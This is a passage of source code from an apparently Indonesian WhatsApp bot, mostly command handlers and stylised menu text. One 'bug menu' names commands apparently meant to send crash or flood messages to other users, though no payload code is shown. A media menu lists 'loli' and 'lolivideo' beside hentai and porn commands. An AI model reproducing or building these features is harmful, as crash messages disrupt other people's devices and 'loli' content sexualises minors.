               reply(mess.wrongFormat)
}
               break
//------------------< Ingfo Bot >-------------------
              case 'runtime':
          	if (!mek.key.fromMe && !isOwner) return fakestatus('SELF-BOT')
          	if (banChats === false) return
          	banChats = false
          	fakestatus(`${runtime(process.uptime())}`)
          	break
       case 'sourcecode': 
       case 'sc': 
       case 'src':
              textImg(`𝑴𝒂𝒖 𝑺𝒄 ? 𝑴𝒂𝒌𝒂𝒏𝒚𝒂 𝑩𝒆𝒍𝒊 𝑫𝒊 𝑮𝒘 𝑺𝒄 𝑩𝒖𝒌𝒂𝒏 𝑫𝒂𝒓𝒊 𝒀𝒕`)
              break
      case 'ping':
      case 'speed':
              timestampe = speed();
              latensie = speed() - timestampe
              reply(`「 *𝙎𝙋𝙀𝙀𝘿 𝙏𝙀𝙎𝙏* 」\nMerespon dalam ${latensie.toFixed(4)} Sec 💬`)
              break
      case 'botstat':
      case 'status':
      case 'stats':
              groups = Hisnu.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = Hisnu.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
              charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await Hisnu.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
teks = `\`\`\`BOT STATISTICS\`\`\`
\`\`\`▢ Group Chats : ${groups.length}\`\`\`
\`\`\`▢ Private Chats : ${privat.length}\`\`\`
\`\`\`▢ Total Chats : ${totalChat.length}\`\`\`
\`\`\`▢ Speed : ${latensie.toFixed(4)} _Second_\`\`\`
\`\`\`▢ Active Time : ${kyun(uptime)}\`\`\`

\`\`\`PHONE STATISTICS\`\`\`
\`\`\`▢ Baterai : ${baterai}% ${charger}\`\`\`
\`\`\`▢ Ram Usage : ${ram2}\`\`\`
\`\`\`▢ Platform : ${os.platform()}\`\`\`
\`\`\`▢ Hostname : ${os.hostname()}\`\`\`
\`\`\`▢ Uptime : ${runtime(process.uptime())}\`\`\`
\`\`\`▢ Wa Version: ${Hisnu.user.phone.wa_version}\`\`\`
\`\`\`▢ Os Version: ${Hisnu.user.phone.os_version}\`\`\`
\`\`\`▢ Device Manufacturer: ${Hisnu.user.phone.device_manufacturer}\`\`\`
\`\`\`▢ Device Model: ${Hisnu.user.phone.device_model}\`\`\`
\`\`\`▢ Os Build Number: ${Hisnu.user.phone.os_build_number}\`\`\``
             reply(teks)
             break  
             
                                      
                        
//------------------< KATALOG MENU >-------------------
case 'photooxy':
menu =`   
*${ucapanWaktu}👋*
*𝐖𝐢𝐛 : ${time}*
*𝐖𝐢𝐭𝐚 : ${timeMak}*
*𝐖𝐢𝐛 : ${timeJay}*

 𝑷𝑯𝑶𝑻𝑶 𝑶𝑿𝒀

📸${prefix}ᴄᴀʀᴠᴇᴅᴡᴏᴏᴅ <ᴛᴇᴋs>
📸${prefix}ʜᴀʀʀʏᴘᴏᴛᴛᴇʀ <ᴛᴇᴋs>
📸${prefix}ғʟᴀᴍᴍɪɴɢ <ᴛᴇᴋs>
📸${prefix}ғᴀʟʟʟᴇᴀᴠᴇs <ᴛᴇᴋs>
📸${prefix}ɢʟᴏᴡɪɴɢɴᴇᴏɴ <ᴛᴇᴋs>
📸${prefix}ʟᴇᴛᴛᴇʀʟᴇᴀᴠᴇs <ᴛᴇᴋs>
📸${prefix}sᴜᴍᴍᴇʀɴᴀᴛᴜʀᴇ <ᴛᴇᴋs>
📸${prefix}ɢᴏʟᴅᴇʀʀᴏsᴇ <ᴛᴇᴋs>
📸${prefix}ᴜɴᴅᴇʀᴡᴀᴛᴇʀ <ᴛᴇᴋs>
📸${prefix}ɴᴀᴛᴜʀᴇ3ᴅ <ᴛᴇᴋs>
📸${prefix}ᴡᴏʟғᴍᴇɴᴛᴀʟ <ᴛᴇᴋs>
📸${prefix}sᴜᴍᴍᴇʀ3ᴅ <ᴛᴇᴋs>
📸${prefix}ᴡᴏᴏᴅᴇɴʙᴏᴀʀᴅ <ᴛᴇᴋs>
📸${prefix}ᴡᴏᴏᴅʜᴇᴀʀᴛ <ᴛᴇᴋs>
📸${prefix}ᴄᴏғғᴇ <ᴛᴇᴋs>
📸${prefix}ᴜɴᴅᴇʀɢʀᴀss <ᴛᴇᴋs>
📸${prefix}ʟᴏᴠᴇᴍᴇssᴀɢᴇ <ᴛᴇᴋs>
📸${prefix}ʙᴜʀɴᴘᴀᴘᴇʀ <ᴛᴇᴋs>
📸${prefix}sᴍᴏᴋᴇ <ᴛᴇᴋs>
📸${prefix}ʀᴏᴍᴀɴᴄᴇ <ᴛᴇᴋs>
📸${prefix}ᴄᴜᴘ <ᴛᴇᴋs>
📸${prefix}ᴄᴜᴘ1 <ᴛᴇᴋs>
📸${prefix}sʜᴀᴅᴏᴡ <ᴛᴇᴋs>

 ⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘
  ͭ ͤ ⷶ ͫ  ͥ ᷠ ᷤ ᷮ ͥ ͬ`
katalog(menu)
break
                    
case 'ephotokon':
menu =`   
*${ucapanWaktu}👋*
*𝐖𝐢𝐛 : ${time}*
*𝐖𝐢𝐭𝐚 : ${timeMak}*
*𝐖𝐢𝐛 : ${timeJay}*

 𝑬𝑷𝑯𝑶𝑻𝑶 𝟑𝟔𝟎

🌐${prefix}ғʀᴇᴇғɪʀᴇ <ᴛᴇᴋs>
🌐${prefix}sɴᴏᴡ3ᴅ <ᴛᴇᴋs>
🌐${prefix}ʙɪʀᴛᴅᴀʏᴅᴀʏ <ᴛᴇᴋs>
🌐${prefix}ɢᴀʟᴀxʏʙᴀᴛ <ᴛᴇᴋs>
🌐${prefix}ᴡʀɪᴛᴇɢᴀʟᴀᴄʏ <ᴛᴇᴋs>  
🌐${prefix}ᴛᴇxᴛʙʏɴᴀᴍᴇ <ᴛᴇᴋs>
🌐${prefix}ᴡᴏᴏᴅᴇɴ3ᴅ <ᴛᴇᴋs> 
🌐${prefix}sᴛᴀʀsɴɪɢʜᴛ <ᴛᴇᴋs>
🌐${prefix}ᴛᴇxᴛᴄᴀᴋᴇ <ᴛᴇᴋs>  
🌐${prefix}ɢʟɪᴛᴛᴇʀɢᴏʟᴅ <ᴛᴇᴋs>
🌐${prefix}ɴᴏᴇʟᴛᴇxᴛ <ᴛᴇᴋs> 
🌐${prefix}ᴍᴇᴛᴀʟʟᴏɢᴏ <ᴛᴇᴋs>
🌐${prefix}ɢʀᴇᴇɴʙᴜsʜ <ᴛᴇᴋs>
🌐${prefix}ɢʀᴇᴇɴɴᴇᴏɴ <ᴛᴇᴋs>
🌐${prefix}ɢʟᴏssʏᴄʜʀᴏᴍᴇ <ᴛᴇᴋs>  
🌐${prefix}ʜᴏʟᴏɢʀᴀᴍ3ᴅ <ᴛᴇᴋs>
🌐${prefix}ɢᴀʟᴀxʏsᴛʏʟᴇ <ᴛᴇᴋs>  
🌐${prefix}ʙʀɪᴛʜᴅᴀʏᴄᴀᴋᴇ <ᴛᴇᴋs>
🌐${prefix}ʜᴇᴀʀᴛsʜᴀᴘᴇᴅ <ᴛᴇᴋs> 
🌐${prefix}ʀᴏʏᴀʟᴛᴇxᴛ <ᴛᴇᴋs>
🌐${prefix}ᴘᴜᴘᴘʏᴄᴜᴛᴇ <ᴛᴇᴋs>
🌐${prefix}ʙᴇᴀᴜᴛɪғᴜʟғʟᴏᴡᴇʀ <ᴛᴇᴋs>  
🌐${prefix}ʟɪɢʜᴛᴛᴇxᴛ <ᴛᴇᴋs>
🌐${prefix}ɢᴀʟᴀxʏᴡᴀʟʟᴘᴀᴘᴇʀ <ᴛᴇᴋs>
🌐${prefix}ʟᴜxᴜʀʏɢᴏʟᴅ <ᴛᴇᴋs>
🌐${prefix}ᴡᴀᴛᴇʀᴄᴏʟᴏʀ <ᴛᴇᴋs>
🌐${prefix}ᴍᴜʟᴛɪᴄᴏʟᴏʀ3ᴅ <ᴛᴇᴋs>  
🌐${prefix}ᴡᴇᴛɢʟᴀss <ᴛᴇᴋs>

 ⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘
  ͭ ͤ ⷶ ͫ  ͥ ᷠ ᷤ ᷮ ͥ ͬ`
katalog(menu)
break
   
//TEXTPROME
case 'textprome':
menu =`
*${ucapanWaktu}👋*
*𝐖𝐢𝐛 : ${time}*
*𝐖𝐢𝐭𝐚 : ${timeMak}*
*𝐖𝐢𝐛 : ${timeJay}*

 𝑻𝑬𝑿𝑻𝑷𝑹𝑶𝑴𝑬

🎄${prefix}ɴᴇᴏɴʟɪɢʜᴛ <ᴛᴇᴋs>
🎄${prefix}ʙʟᴀᴄᴋᴘɪɴᴋ <ᴛᴇᴋs>
🎄${prefix}ɴᴇᴏɴ <ᴛᴇᴋs>
🎄${prefix}ɢʀᴇᴇɴɴᴇᴏɴ <ᴛᴇᴋs>
🎄${prefix}ᴀᴅᴠᴀɴᴄᴇɢʟᴏᴡ <ᴛᴇᴋs>
🎄${prefix}ғᴜᴛᴜʀᴇɴᴇᴏɴ <ᴛᴇᴋs>
🎄${prefix}sᴀɴᴅᴡʀɪᴛɪɴɢ <ᴛᴇᴋs>
🎄${prefix}sᴀɴᴅsᴜᴍᴍᴇʀ <ᴛᴇᴋs>
🎄${prefix}sᴀɴᴅᴇɴɢʀᴀᴠᴇᴅ <ᴛᴇᴋs>
🎄${prefix}ᴍᴇᴛᴀʟᴅᴀʀᴋ <ᴛᴇᴋs>
🎄${prefix}ʜᴏʟᴏɢʀᴀᴘʜɪᴄ <ᴛᴇᴋs>
🎄${prefix}ᴛᴇxᴛ1917 <ᴛᴇᴋs>
🎄${prefix}ᴍɪɴɪᴏɴ <ᴛᴇᴋs>
🎄${prefix}ᴅᴇʟᴜxᴇsɪʟᴠᴇʀ <ᴛᴇᴋs>
🎄${prefix}ɴᴇᴡʏᴇᴀʀᴄᴀʀᴅ <ᴛᴇᴋs>
🎄${prefix}ʙʟᴏᴏᴅғʀᴏsᴛᴇᴅ <ᴛᴇᴋs>
🎄${prefix}ʜᴀʟʟᴏᴡᴇɴ <ᴛᴇᴋs>
🎄${prefix}ᴊᴏᴋᴇʀʟᴏɢᴏ <ᴛᴇᴋs>
🎄${prefix}ғɪʀᴇᴡᴏʀᴋsᴘᴀʀᴋʟᴇ <ᴛᴇᴋs>
🎄${prefix}ɴᴀᴛᴜʀᴇʟᴇᴀᴠᴇs <ᴛᴇᴋs>
🎄${prefix}ʙᴏᴋᴇʜ <ᴛᴇᴋs>
🎄${prefix}ᴛᴏxɪᴄ <ᴛᴇᴋs>
🎄${prefix}sᴛʀᴀᴡʙᴇʀʀʏ <ᴛᴇᴋs>
🎄${prefix}ʙᴏx3ᴅ <ᴛᴇᴋs>
🎄${prefix}ʀᴏᴀᴅᴡᴀʀɴɪɴɢ <ᴛᴇᴋs>
🎄${prefix}ʙʀᴇᴀᴋᴡᴀʟʟ <ᴛᴇᴋs>
🎄${prefix}ɪᴄᴇᴄᴏʟᴅ <ᴛᴇᴋs>
🎄${prefix}sᴜᴍᴍᴇʀsᴀɴᴅ <ᴛᴇᴋs>
🎄${prefix}ʜᴏʀʀᴏʀʙʟᴏᴏᴅ <ᴛᴇᴋs>
🎄${prefix}ᴛʜᴜɴᴅᴇʀ <ᴛᴇᴋs

 ⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘
  ͭ ͤ ⷶ ͫ  ͥ ᷠ ᷤ ᷮ ͥ ͬ`
katalog(menu)
break
    
//NEW FITUR
case 'newfitur':
menu =`
*${ucapanWaktu}👋*
*𝐖𝐢𝐛 : ${time}*
*𝐖𝐢𝐭𝐚 : ${timeMak}*
*𝐖𝐢𝐛 : ${timeJay}*

 𝑵𝑬𝑾 𝑭𝑰𝑻𝑼𝑹
 
🎬${prefix}ᴘᴀɴᴅᴀ
🎬${prefix}ᴘᴀɴᴅᴀ1
🎬${prefix}ʙɪʀᴅ
🎬${prefix}ᴋᴏᴀʟᴀ
🎬${prefix}ᴅᴀʀᴋᴊᴏᴋᴇs
🎬${prefix}ᴀᴍᴏɴɢᴜs <ᴛᴇᴋs>
🎬${prefix}ᴛᴛs <ᴋᴏᴅᴇ ʙᴀʜᴀsᴀ>
🎬${prefix}ʏᴛɢᴏʟᴅ <ᴛᴇᴋs>
🎬${prefix}ʏᴛsɪʟᴠᴇʀ <ᴛᴇᴋs>
🎬${prefix}ʟᴏɢᴏᴀ <ᴛᴇᴋs&ᴛᴇᴋs>
🎬${prefix}pornhub <ᴛᴇᴋs&ᴛᴇᴋs>
🎬${prefix}ᴛᴀʜᴛᴀ <ᴛᴇᴋs>
🎬${prefix}ᴍᴀʀᴠᴇʟ <ᴛᴇᴋs&ᴛᴇᴋs
🎬${prefix}ᴡᴀʟʟ <ᴛᴇᴋs>
🎬${prefix}ᴛᴜᴘᴀɪ <ʀᴇᴘʟʏ ᴀᴜᴅɪᴏ>
🎬${prefix}ʙᴀss <ʀᴇᴘʟʏ ᴀᴜᴅɪᴏ>
🎬${prefix}ɢʜᴏsᴛ <ʀᴇᴘʟʏ ᴀᴜᴅɪᴏ>
🎬${prefix}ɢᴇᴍᴏᴋ <ʀᴇᴘʟʏ ᴀᴜᴅɪᴏ>
🎬${prefix}ғᴀsᴛ <ʀᴇᴘʟʏ ᴀᴜᴅɪᴏ>

 ⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘
  ͭ ͤ ⷶ ͫ  ͥ ᷠ ᷤ ᷮ ͥ ͬ`
katalog(menu)
break

//INFO MENU
case 'infomenu':
if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
uptime = process.uptime();
menu =`
*${ucapanWaktu}👋*
*𝐖𝐢𝐛 : ${time}*
*𝐖𝐢𝐭𝐚 : ${timeMak}*
*𝐖𝐢𝐛 : ${timeJay}*

 𝑰𝑵𝑭𝑶 𝑴𝑬𝑵𝑼
 
⚡ᴄᴇᴋᴘʀᴇғɪx
⚡${prefix}ʙᴏᴛsᴛᴀᴛ
⚡${prefix}ʟɪᴍɪᴛ
⚡${prefix}ɢʟɪᴍɪᴛ
⚡${prefix}ʙᴜʏʟɪᴍɪᴛ <ᴀɴɢᴋᴀ>
⚡${prefix}ʙᴜʏɢʟɪᴍɪᴛ <ᴀɴɢᴋᴀ>
⚡${prefix}ʙᴀʟᴀɴᴄᴇ
⚡${prefix}ʀᴜɴᴛɪᴍᴇ
⚡${prefix}sᴘᴇᴇᴅ
⚡${prefix}ᴏᴡɴᴇʀ
⚡${prefix}ᴅᴏɴᴀsɪ
⚡${prefix}ʀᴜʟᴇs
⚡${prefix}ʀᴇᴘᴏʀᴛ <ʙᴜɢ ɴʏᴀ>
⚡${prefix}sᴏᴜʀᴄᴇᴄᴏᴅᴇ
⚡${prefix}ʟɪsᴛᴘʀᴇᴍɪᴜᴍ
⚡${prefix}ᴛᴀɢᴍᴇ
⚡${prefix}ʟɪsᴛʙᴀɴ
⚡${prefix}ʟɪsᴛʙᴏᴛ
⚡${prefix}sɴᴋ

 ⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘
  ͭ ͤ ⷶ ͫ  ͥ ᷠ ᷤ ᷮ ͥ ͬ`
katalog(menu)
break

//BUG MENU
case 'sewadong':
menu =`
 𝐋𝐈𝐒𝐓 𝐒𝐄𝐖𝐀 𝐁𝐎𝐓🌹
 𝟏 𝑴𝒊𝒏𝒈𝒈𝒖 : 𝟏𝟎𝑲
 𝟏 𝑩𝒖𝒍𝒂𝒏 : 𝟏𝟓𝑲
 𝑷𝒆𝒓𝒎𝒂𝒏𝒆𝒏 : 𝟐𝟎𝑲
 𝑱𝒐𝒊𝒏 𝑴𝒖𝒓𝒊𝒅 𝑩𝒐𝒕 : 𝟐𝟓𝑲
 
 
 ,🗣️ = ＦＩＴＵＲ ＢＡＮＧ?
 𝑳𝑰𝑺𝑻 𝑭𝑰𝑻𝑼𝑹

•𝗔𝗡𝗧𝗜𝗟𝗜𝗡𝗞
•𝗔𝗡𝗧𝗜𝗩𝗜𝗥𝗧𝗘𝗫
•𝗔𝗡𝗧𝗜𝗛𝗜𝗗𝗘𝗧𝗔𝗚
•𝗪𝗘𝗟𝗖𝗢𝗠𝗘
•𝗚𝗥𝗨𝗣 𝗠𝗘𝗡𝗨
•𝗦𝗧𝗜𝗖𝗞𝗘𝗥 𝗠𝗘𝗡𝗨
𝗗𝗮𝗻 𝗟𝗮𝗶𝗻 - 𝗟𝗮𝗶𝗻
⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘
  ͭ ͤ ⷶ ͫ  ͥ ᷠ ᷤ ᷮ ͥ ͬ`
katalog(menu)
break

case 'bugmenu':
menu =`
*${ucapanWaktu}👋*
*𝐖𝐢𝐛 : ${time}*
*𝐖𝐢𝐭𝐚 : ${timeMak}*
*𝐖𝐢𝐛 : ${timeJay}*

 𝑩𝑼𝑮 𝑴𝑬𝑵𝑼
 
🗿${prefix}ʙᴜɢ1
🗿${prefix}ʙᴜɢ2
🗿${prefix}ʙᴜɢ3 <ᴊᴜᴍʟᴀʜ>
🗿${prefix}bugpc
🗿${prefix}ʙᴜɢᴘᴄ2 <ᴊᴜᴍʟᴀʜ>
🗿${prefix}ʙᴜɢᴛʀᴏʟɪ
🗿${prefix}ʙᴜɢᴛʀᴏʟɪ2 <ᴊᴜᴍʟᴀʜ>
🗿${prefix}ʙᴜghole
🗿${prefix}ʙᴜɢᴠɴ
🗿${prefix}ʙᴜɢʟᴏᴋᴀsɪ
🗿${prefix}ʙᴜɢᴄᴏᴍʙɪɴᴇ
🗿${prefix}ʙᴜɢᴋᴀᴛᴀʟᴏɢ

⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘
  ͭ ͤ ⷶ ͫ  ͥ ᷠ ᷤ ᷮ ͥ ͬ`
katalog(menu)
break

//FUN MENU
case 'funmenu':
menu =`
*${ucapanWaktu}👋*
*𝐖𝐢𝐛 : ${time}*
*𝐖𝐢𝐭𝐚 : ${timeMak}*
*𝐖𝐢𝐛 : ${timeJay}*

 𝑭𝑼𝑵 𝑴𝑬𝑵𝑼
 
🙆‍♂️${prefix}ᴍɪɴɪɴɢ
🙆‍♂️${prefix}ᴛᴏɢᴇʟ
🙆‍♂️${prefix}ᴄᴇᴋᴡᴀᴛᴀᴋ
🙆‍♂️${prefix}ᴄᴇᴋᴍᴀᴛɪ
🙆‍♂️${prefix}ᴡᴀɴɢʏ
🙆‍♂️${prefix}ᴄɪᴛᴀᴄɪᴛᴀ
🙆‍♂️${prefix}ᴛᴏxɪᴄ
🙆‍♂️${prefix}ᴛʀᴜᴛʜ
🙆‍♂️${prefix}ᴅᴀʀᴇ
🙆‍♂️${prefix}ᴀᴘᴀᴋᴀʜ
🙆‍♂️${prefix}ʙɪsᴀᴋᴀʜ
🙆‍♂️${prefix}ᴋᴀᴘᴀɴᴋᴀʜ
🙆‍♂️${prefix}ʀᴀᴛᴇ
🙆‍♂️${prefix}ᴊᴀᴅɪᴀɴ
🙆‍♂️${prefix}ᴄᴀɴᴛɪᴋ
🙆‍♂️${prefix}ɢᴀɴᴛᴇɴɢ
🙆‍♂️${prefix}ʙᴇʙᴀɴ
🙆‍♂️${prefix}ʙᴀʙɪ
🙆‍♂️${prefix}ᴄᴇᴋɢᴀɴᴛᴇɴɢ
🙆‍♂️${prefix}ᴄᴇᴋᴄᴀɴᴛɪᴋ

⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘
  ͭ ͤ ⷶ ͫ  ͥ ᷠ ᷤ ᷮ ͥ ͬ`
katalog(menu)
break

//GAME MENU
case 'gamemenu':
menu =`
*${ucapanWaktu}👋*
*𝐖𝐢𝐛 : ${time}*
*𝐖𝐢𝐭𝐚 : ${timeMak}*
*𝐖𝐢𝐛 : ${timeJay}*

 𝑮𝑨𝑴𝑬 𝑴𝑬𝑵𝑼
 
🎮${prefix}sʟᴏᴛ
🎮${prefix}ʟɪᴍɪᴛɢᴀᴍᴇ
🎮${prefix}ɢᴇʟᴜᴅ <ᴛᴀɢ>
🎮${prefix}ᴛɪᴄᴛᴀᴄᴛᴏᴇ <ᴛᴀɢ>
🎮${prefix}sɪᴀᴘᴀᴀᴋᴜ
🎮${prefix}ғᴀᴍɪʟʏ100
🎮${prefix}ᴋᴜɪsᴍᴀᴛʜ
🎮${prefix}ᴀsᴀʜᴏᴛᴀᴋ
🎮${prefix}ᴛᴇʙᴀᴋʟɪʀɪᴋ
🎮${prefix}ᴛᴇʙᴀᴋʟᴀɢᴜ
🎮${prefix}ᴛᴇʙᴀᴋᴋᴀᴛᴀ
🎮${prefix}sᴜsᴜɴᴋᴀᴛᴀ
🎮${prefix}ᴋɪᴍɪᴀᴋᴜɪs
🎮${prefix}ᴄᴀᴋʟᴏɴᴛᴏɴɢ
🎮${prefix}ᴛᴇʙᴀᴋᴊᴇɴᴀᴋᴀ
🎮${prefix}ᴛᴇʙᴀᴋᴀɴɪᴍᴇ
🎮${prefix}ᴛᴇʙᴀᴋᴛᴇʙᴀᴋᴀɴ
🎮${prefix}ᴛᴇʙᴀᴋɢᴀᴍʙᴀʀ
🎮${prefix}ᴛᴇʙᴀᴋʙᴇɴᴅᴇʀᴀ
🎮${prefix}sᴜɪᴛ <ʙᴀᴛᴜ/ᴋᴇʀᴛᴀs/ɢᴜɴᴛɪɴɢ>

⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘
  ͭ ͤ ⷶ ͫ  ͥ ᷠ ᷤ ᷮ ͥ ͬ`
katalog(menu)
break

//STICKER MENU
case 'stickermenu':
menu =`
*${ucapanWaktu}👋*
*𝐖𝐢𝐛 : ${time}*
*𝐖𝐢𝐭𝐚 : ${timeMak}*
*𝐖𝐢𝐛 : ${timeJay}*

 𝑺𝑻𝑰𝑪𝑲𝑬𝑹 𝑴𝑬𝑵𝑼
 
☕${prefix}ᴅᴀᴅᴜ
☕${prefix}ᴅᴏɢᴇ
☕${prefix}ᴛᴏɪᴍɢ
☕${prefix}ᴘᴀᴛʀɪᴄᴋ
☕${prefix}ɢᴀʀᴡɢᴜʀᴀ
☕${prefix}ᴀᴍᴏɴɢᴜs <ᴛᴇᴋs>
☕${prefix}ᴛᴛɢ <ᴛᴇᴋs>
☕${prefix}ᴀᴛᴛᴘ <ᴛᴇᴋs>
☕${prefix}sᴛɪᴄᴋᴇʀᴀɴɪᴍᴇ
☕${prefix}sᴇᴍᴏᴊɪ <ᴇᴍᴏᴊɪ>
☕${prefix}ᴇᴍᴏᴊɪ <ᴇᴍᴏᴊɪ>
☕${prefix}sᴛɪᴄᴋᴇʀ <ʀᴇᴘʟʏ ғᴏᴛᴏ / ᴠɪᴅᴇᴏ>
☕${prefix}sᴍᴇᴍᴇ
☕${prefix}sᴡᴍ
☕${prefix}ᴛᴀᴋᴇ
☕${prefix}ᴛᴏᴠɪᴅᴇᴏ

⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘
  ͭ ͤ ⷶ ͫ  ͥ ᷠ ᷤ ᷮ ͥ ͬ`
katalog(menu)
break

//GRUP MENU

case 'grupmenu':
case 'groupmenu':
menu =`
*${ucapanWaktu}👋*
*𝐖𝐢𝐛 : ${time}*
*𝐖𝐢𝐭𝐚 : ${timeMak}*
*𝐖𝐢𝐛 : ${timeJay}*

 𝑮𝑹𝑼𝑷 𝑴𝑬𝑵𝑼
 
⚙️${prefix}ᴀғᴋ
⚙️${prefix}ɴᴏᴛɪғ <ᴛᴇᴋs>
⚙️${prefix}ɪɴғᴏɢʀᴜᴘ
⚙️${prefix}ᴄʜᴀᴛɪɴғᴏ
⚙️${prefix}ᴋɪᴄᴋ <ᴛᴀɢ>
⚙️${prefix}ᴘʀᴏᴍᴏᴛᴇ <ᴛᴀɢ>
⚙️${prefix}ᴅᴇᴍᴏᴛᴇ <ᴛᴀɢ>
⚙️${prefix}ʟɪɴᴋɢᴄ
⚙️${prefix}ʟᴇᴀᴠᴇ
⚙️${prefix}sᴇᴛᴅᴇsᴄ <ᴛᴇᴋs>
⚙️${prefix}sᴇᴛɢᴛᴜᴘɴᴀᴍᴇ <ᴛᴇᴋs>
⚙️${prefix}sᴇᴛᴘᴘɢʀᴜᴘ <ғᴏᴛᴏ>
⚙️${prefix}ɢʀᴜᴘsᴇᴛᴛɪɴɢ
⚙️${prefix}ᴛᴀɢᴀʟʟ
⚙️${prefix}ʜɪᴅᴇᴛᴀɢ <ᴛᴇᴋs>
⚙️${prefix}ᴍᴜᴛᴇ
⚙️${prefix}ᴜɴᴍᴜᴛᴇ
⚙️${prefix}ᴀɴᴛɪʟɪɴᴋ <ᴇɴᴀʙʟᴇ/ᴅɪsᴀʙʟᴇ>
⚙️${prefix}ᴡᴇʟᴄᴏᴍᴇ <ᴇɴᴀʙʟᴇ/ᴅɪsᴀʙʟᴇ>
⚙️${prefix}ᴀɴᴛɪʙᴀᴅᴡᴏʀᴅ
⚙️${prefix}ʟɪsᴛʙᴀᴅᴡᴏʀᴅ
⚙️${prefix}ᴀᴅᴅʙᴀᴅᴡᴏʀᴅ
⚙️${prefix}ᴅᴇʟʙᴀᴅᴡᴏʀᴅ

⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘
  ͭ ͤ ⷶ ͫ  ͥ ᷠ ᷤ ᷮ ͥ ͬ`
katalog(menu)
break

//DOWNLOAD MENU
case 'downloadmenu':
menu =`
*${ucapanWaktu}👋*
*𝐖𝐢𝐛 : ${time}*
*𝐖𝐢𝐭𝐚 : ${timeMak}*
*𝐖𝐢𝐛 : ${timeJay}*
  
 𝑫𝑶𝑾𝑵𝑳𝑶𝑨𝑫 𝑴𝑬𝑵𝑼
 
🔋${prefix}ғᴀᴄᴇʙᴏᴏᴋ <ᴜʀʟ>
🔋${prefix}ɴᴛʜᴇɴᴛᴀɪᴘɢғ <ᴜʀʟ>
🔋${prefix}ᴛɪᴋᴛᴏᴋ <ᴜʀʟ>
🔋${prefix}twitter <ᴜʀʟ>
🔋${prefix}tiktoknowm <ᴜʀʟ>
🔋${prefix}igdl <ᴜʀʟ>
🔋${prefix}ytmp3 <ᴜʀʟ>
🔋${prefix}ytmp4 <ᴜʀʟ>
🔋${prefix}mediafire <ᴜʀʟ>
🔋${prefix}soundcloud <ᴜʀʟ>
🔋${prefix}tiktokaudio <ᴜʀʟ>
🔋${prefix}play <ǫᴜᴇʀʏ>

⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘
  ͭ ͤ ⷶ ͫ  ͥ ᷠ ᷤ ᷮ ͥ ͬ`
katalog(menu)
break
 
//WIBU MENU
case 'wibumenu':
menu =`
*${ucapanWaktu}👋*
*𝐖𝐢𝐛 : ${time}*
*𝐖𝐢𝐭𝐚 : ${timeMak}*
*𝐖𝐢𝐛 : ${timeJay}*

 𝑾𝑰𝑩𝑼 𝑴𝑬𝑵𝑼
 
🧄${prefix}ʟᴏʟɪ
🧄${prefix}ᴍᴀɴɢᴀ
🧄${prefix}ᴀɴɪᴍᴇ
🧄${prefix}ʟᴏʟɪᴠɪᴅᴇᴏ
🧄${prefix}ʜᴜsʙᴜ
🧄${prefix}ᴡᴀɪғᴜ
🧄${prefix}ᴍɪʟғ
🧄${prefix}ɴᴇᴋᴏ
🧄${prefix}ᴋᴀɴɴᴀ
🧄${prefix}sᴀɢɪʀɪ
🧄${prefix}ʜᴇɴᴛᴀɪ
🧄${prefix}ᴄᴏsᴘʟᴀʏ
🧄${prefix}ᴡᴀʟʟɴɪᴍᴇ
🧄${prefix}ᴋᴜsᴏɴɪᴍᴇ
🧄${prefix}ᴍᴇɢᴜᴍɪɴ
🧄${prefix}ᴏᴛᴀᴋᴅᴇsᴜ
🧄${prefix}ᴅᴏᴜᴊɪɴᴅᴇsᴜ
🧄${prefix}sᴛᴏʀʏᴀɴɪᴍᴇ
🧄${prefix}ɴᴀᴋᴀɴᴏᴍɪᴋᴜ
🧄${prefix}ɴᴀᴋᴀɴᴏɴɪɴᴏ
🧄${prefix}ɴᴀᴋᴀɴᴏɪᴛsᴜᴋɪ
🧄${prefix}ᴏᴛᴀᴋᴜᴏɴɢᴏɪɴɢ
🧄${prefix}ɴʜᴇɴᴛᴀɪ
🧄${prefix}ɴɴᴇᴋᴏᴘᴏɪ
🧄${prefix}ɴᴇᴋᴏᴘᴏɪ3ᴅ
🧄${prefix}ɴᴇᴋᴏᴘᴏɪᴄᴏsᴘʟᴀʏ
🧄${prefix}ɴᴇᴋᴏᴘᴏɪsᴇᴀʀᴄʜ

⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘
  ͭ ͤ ⷶ ͫ  ͥ ᷠ ᷤ ᷮ ͥ ͬ`
katalog(menu)
break

//BOKEP MENU:V
